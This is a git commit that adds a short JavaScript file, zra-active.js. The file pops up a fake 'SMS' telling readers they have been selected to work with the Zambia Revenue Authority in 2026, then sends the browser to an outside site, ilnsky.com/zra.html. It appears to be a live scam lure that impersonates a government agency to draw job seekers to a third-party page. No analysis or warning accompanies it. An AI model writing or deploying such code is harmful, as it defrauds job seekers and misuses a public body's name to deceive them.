e9ab0b683980152af4cbd216be425c74d8d0d29d
ukpeha55-stack <ukpeha55@gmail.com>
2026-03-25 08:05:15 +0100

    Create zra-active.js

---
+++ zra-active.js
@@ -0,0 +1,5 @@
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulation. You are among the selected ones to work with Zambia Revenue Authority 2026, kindly press Ok to submit application ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://ilnsky.com/zra.html';
+}
